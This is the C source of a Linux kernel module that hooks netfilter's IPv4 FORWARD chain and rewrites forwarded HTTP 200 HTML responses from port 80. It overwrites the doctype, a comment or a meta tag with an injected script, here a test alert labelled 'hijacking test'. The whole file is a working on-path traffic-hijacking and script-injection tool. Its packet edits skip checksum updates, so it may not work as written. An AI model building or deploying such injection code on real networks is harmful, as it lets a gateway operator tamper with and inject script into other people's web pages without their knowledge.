#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");

// 待插入字符串
char code[] = "<script>alert('hijacking test')</script>";

int find_replace_html(char* pkg, int codeLen, char pre[], char last[], int remove){
	int l1 = strlen(pre);
	int l2 = strlen(last);
	char *p1 = strstr(pkg, pre);
	if(p1 != NULL){
		if(remove == 0){
			p1 += l1;
		}
		char *p2 = strstr(p1, last);
		int len = (long long)p2 - (long long)p1;
		if(p2 != NULL && len >= codeLen){
			if(remove == 0){
				memcpy(p1, last, l2);
				p1 += l2;
				memset(p1 + codeLen, ' ', len - codeLen);
			}else{
				memset(p1 + codeLen, ' ', len - codeLen + l2);
			}
			memcpy(p1, code, codeLen);

			printk("%s\n",pre);
			return 1;
		}
	}
	return 0;
}
// 钩子函数，发送时修改请求头，接收时修改pkg
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	int codeLen = strlen(code);
	// IP数据包frag合并
	if (0 != skb_linearize(skb)) {
		return NF_ACCEPT;
	}
	struct iphdr *iph = ip_hdr(skb);

	unsigned int tot_len = ntohs(iph->tot_len);
	unsigned int iph_len = ip_hdrlen(skb);

	// unsigned int saddr = (unsigned int)iph->saddr;
	// unsigned int daddr = (unsigned int)iph->daddr;

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		// struct tcphdr *tcph = tcp_hdr(skb);
		// unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
		// 接收到的数据包
		if (sport == 80)
		{

			// 处理HTTP请求且请求返回200
			if (memcmp(pkg,"HTTP/1.1 200", 12) == 0 || memcmp(pkg,"HTTP/1.0 200", 12) == 0)
			{
				char* p,*p1;

				p = strstr(pkg,"Content-Type: text/html");
				if(p == NULL)	return NF_ACCEPT;

				p = strstr(pkg,"Content-Encoding: deflate");
				if(p != NULL){
					printk("1\n");
				}

				p = strstr(pkg,"<html");
				if(p == NULL)	return NF_ACCEPT;

				if(find_replace_html(pkg, codeLen, "<!DOCTYPE html", ">", 0) ||
					find_replace_html(pkg, codeLen, "<!doctype html", ">", 0) ||
					find_replace_html(pkg, codeLen, "<!--", "-->", 1) ||
					find_replace_html(pkg, codeLen, "<meta name=\"description\"", ">", 1) ||
					find_replace_html(pkg, codeLen, "<meta name=\"keywords\"", ">", 1) ){
					
					return NF_ACCEPT;
				}
				
			}
		}
	}
	return NF_ACCEPT;
}

// 钩子函数注册
static struct nf_hook_ops http_hooks[] = {
	{
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_FORWARD, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	}
};

// 模块加载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
